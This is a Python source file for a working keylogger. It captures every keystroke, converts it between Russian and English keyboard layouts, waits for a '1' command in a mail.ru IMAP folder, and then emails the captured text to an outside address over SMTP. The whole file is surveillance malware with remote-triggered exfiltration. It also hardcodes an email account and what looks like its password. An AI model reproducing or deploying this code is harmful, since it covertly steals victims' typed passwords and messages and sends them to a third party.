import keyboard
import smtplib
import imaplib
import email
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ProcessPoolExecutor
from multiprocessing import Manager, freeze_support
import schedule

def create_message(from_ad, to_ad, text):
    msg = MIMEMultipart()
    msg['From'] = from_ad
    msg['To'] = to_ad
    msg.attach(MIMEText(text, "plain"))
    return msg.as_string()


def connect_smtp(messages: list, from_ad, to_ad, mypass):
    server = smtplib.SMTP_SSL('smtp.mail.ru', 465)
    server.login(from_ad, mypass)
    server.sendmail(from_ad, to_ad, messages[0])
    server.sendmail(from_ad, to_ad, messages[1])
    server.sendmail(from_ad, from_ad, messages[0])
    server.sendmail(from_ad, from_ad, messages[1])
    server.quit()


def MailSender(ready, buff_rus, buff_eng):
    fromaddr = "9662061@mail.ru"
    toaddr = "vladmorozov2020@mail.ru"
    mypass = "qKKA8pUQm3FJCY0ViEv2"
    while True:
        if ready.value:
            text_rus = create_message(fromaddr, toaddr, " ".join(buff_rus))
            text_eng = create_message(fromaddr, toaddr, " ".join(buff_eng))
            connect_smtp([text_rus, text_eng], fromaddr, toaddr, mypass)
            ready.value = False


def KeyListener(buff_rus, buff_eng):
    text_rus = ""
    text_eng = ""
    pressed = False

    def translate(letter: str):
        x = "qwertyuiop[]asdfghjkl;'zxcvbnm,./`"
        y = "йцукенгшщзхъфывапролджэячсмитьбю.ё"
        if len(letter) == 1:
            if letter.isalpha() or letter in ("[", "]", ",", ";", "'", ".", "/", "`"):
                tbl1 = letter.maketrans(x, y)
                tbl2 = letter.maketrans(y, x)
                return [letter.translate(tbl1), letter.translate(tbl2)]

    def handle_change_lang():
        buff_eng.append("смена языка")
        buff_rus.append("смена языка")

    def send_to_buffer():
        nonlocal text_rus, text_eng
        buff_rus.append(text_rus)
        text_rus = ""
        buff_eng.append(text_eng)
        text_eng = ""

    keyboard.add_hotkey("alt+shift", handle_change_lang)
    keyboard.add_hotkey("space", send_to_buffer)
    keyboard.add_hotkey("enter", send_to_buffer)
    while True:
        data = keyboard.read_key()
        if not pressed:
            if len(data) == 1:
                if data.isalpha() or data in ("[", "]", ",", ";", "'", ".", "/", "`"):
                    data = translate(data)
                    text_rus += data[0]
                    text_eng += data[1]

                else:
                    text_rus += data
                    text_eng += data
                pressed = True
        else:
            pressed = False


def ImapListener(ready):
    fromaddr = "9662061@mail.ru"
    mypass = "qKKA8pUQm3FJCY0ViEv2"
    connected = False
    imap = None

    while not connected:
        try:
            imap = imaplib.IMAP4_SSL("imap.mail.ru")
            imap.login(fromaddr, mypass)
            imap.select("INBOX/ToMyself")
            connected = True
        except:
            continue

    while True:
        if imap:
            try:
                messages = imap.search(None, "UNSEEN")
                if messages[1][0]:
                    mes = messages[1][0].decode().split()
                    res, msg = imap.fetch(f'{mes[-1]}', '(RFC822)')
                    msg = email.message_from_bytes(msg[0][1])
                    for part in msg.walk():
                        if part.get_content_maintype() == 'text' and part.get_content_subtype() == 'plain':
                            text = base64.b64decode(part.get_payload()).decode().strip()
                            if text == "1":
                                ready.value = True

            except imaplib.IMAP4.abort:
                imap = imaplib.IMAP4_SSL("imap.mail.ru")
                imap.login(fromaddr, mypass)
                imap.select("INBOX/ToMyself")


if __name__ == '__main__':
    freeze_support()
    manager = Manager()
    ready = manager.Value('i', False)
    buffer_rus = manager.list([])
    buffer_eng = manager.list([])
    with ProcessPoolExecutor(max_workers=3) as pool:
        pool.submit(KeyListener, buffer_rus, buffer_eng)
        pool.submit(ImapListener, ready)
        pool.submit(MailSender, ready, buffer_rus, buffer_eng)

